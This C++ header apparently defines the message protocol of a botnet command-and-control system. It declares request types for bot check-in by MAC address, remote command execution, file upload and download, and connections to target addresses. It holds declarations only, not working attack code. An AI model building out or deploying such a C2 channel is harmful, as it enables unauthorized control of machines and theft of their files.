#pragma once
#include "mac_addr.h"
#include "default_deserialize.h"
#include <boost/asio/ip/address.hpp>
#include <ostream>

namespace cnc { namespace common {
	struct bot_protocol
	{
		enum class types : std::uint8_t
		{
			// answer types
			OK,
			ERR, // ERROR

			// request types
			HELLO,			// payload: hello_data, answer: OK|{ERROR + string}
			RECV_FILE,		// payload: path, answer: OK|{ERROR + string}
			SEND_FILE,		// payload: path, answer: OK|{ERROR + string}
			BLOB,			// payload: byte[], answer: none
			EXEC,			// payload: string, answer: {OK + string}|{ERROR + string}
			CONNECT,		// payload: connect_data, answer: OK|{ERROR + string}
			QUIT			// payload: none|string, answer: OK|{ERROR + string}
		};

		static constexpr std::uint8_t magic_byte = 0xAA;

		struct connect_data
		{
			boost::asio::ip::address target_ip;
			unsigned short target_port;
		};

		struct hello_data
		{
			mac_addr mac;
		};

		struct exec_msg
		{
			std::uint8_t type;
			std::string msg;
		};
	};

	template<class CharT, class Traits>
	std::basic_ostream<CharT, Traits>& operator<<(std::basic_ostream<CharT, Traits>& os, bot_protocol::types type)
	{
		using types = bot_protocol::types;
		switch (type)
		{
		case types::OK:			return os << "OK";
		case types::ERR:		return os << "ERR";

		case types::HELLO:		return os << "HELLO";
		case types::RECV_FILE:	return os << "RECV_FILE";
		case types::SEND_FILE:	return os << "SEND_FILE";
		case types::BLOB:		return os << "BLOB";
		case types::EXEC:		return os << "EXEC";
		case types::CONNECT:	return os << "CONNECT";
		case types::QUIT:		return os << "QUIT";
		}

		throw std::runtime_error("unknown bot_protocol type");
	}

	std::string serialize(const bot_protocol::connect_data &req);
	template<>
	bot_protocol::connect_data deserialize<bot_protocol::connect_data>(const std::string &str);

	std::string serialize(const bot_protocol::hello_data &entry);
	template<>
	bot_protocol::hello_data deserialize<bot_protocol::hello_data>(const std::string &str);
} }